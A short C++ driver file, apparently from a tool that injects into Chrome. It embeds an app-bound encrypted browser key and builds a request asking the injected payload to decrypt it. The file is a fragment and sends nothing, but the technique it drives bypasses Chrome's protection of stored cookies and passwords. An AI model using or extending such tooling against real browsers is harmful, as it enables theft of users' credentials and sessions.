#include "../../src/injector/injector_api.hpp"
#include "../../src/payload/messages.cpp"

int wmain(int argc, wchar_t* argv[]) {
    bool verbose = true;
    char* app_bound_encrypted_key="QVBQQgEAAADQjJ3fARXREYx6AMBPwpfrAQAAAEIFPa64usdIp89Z90A0TTEQAAAAHAAAAEcAbwBvAGcAbABlACAAQwBoAHIAbwBtAGUAAAAQZgAAAAEAACAAAABZWpeZnUMaCyvtPE8F05XH2gtbNl/iiVuXi6hZ/hTWRQAAAAAOgAAAAAIAACAAAAAdEw5TmyVCJofp2C41boXuqgADRXla1Vwy9QOjt/ml+pABAADUY9BwAllug/UGqFvS/bjIe8GWzqIfefMlIiq/dZtytkgnffhY0ZeAYx6taYQCr8yJ8I+LDFdVm39bZ/6dza5V5MVfqmpyJ1IrQh3UJUm1r5pvdF6d52SUOT6gGMhnmg+wc138yaxciwEz2MP6NRjTaAeV8tOWSBXrJIYx3nBudQKrKez2REUzttj43WcieOqTjS+GfrN9LE3KOkMNJKX5tk8xAKQAdXH9oqlkIganj7qEp8tqYv+qqhVUtRDKLfaCu94aFbR3hkUl14n4+DKq5+i+zFAk4xG9EInRbZA4bJd3sYWM2h3gFy1Pu6/WNaw23qHM0XHB/aoDHEzET3zDeiKXwyrFVCFX0Hufri8SEcvF9O81PI3KIp3lT3J5mRpeEF2X910uFY8eSL+NRzs8QPRAS2LsXRyCpn1wvG7a+1VbKyaxB90Si6KFyk6ovIfSseKwZxe+kQPF6FRpQ5hacogkUitSn/nhAqSH0d2TVJMTvFXgZHfYdFtL3PtxoPH7BVDDx6zvAQkKJWt2Y98tQAAAAIx7ZO7xAS+e00GJcpSSZ8mnShIuEEvJ4Pq6AkQYiznIbrLeAlTLmbZ5TrRQZ3XbyhEwOhSKRKVqhRdbOgDCIP0=";
    Payload::request_msg msg;
    msg.command_id = static_cast<uint32_t>(Payload::Command::DECRYPT_APP_BOUND_ENCRYPTED_KEY);
    msg.payload_length = std::strlen(app_bound_encrypted_key);
    msg.payload = app_bound_encrypted_key;
    Payload::Request request(msg);


}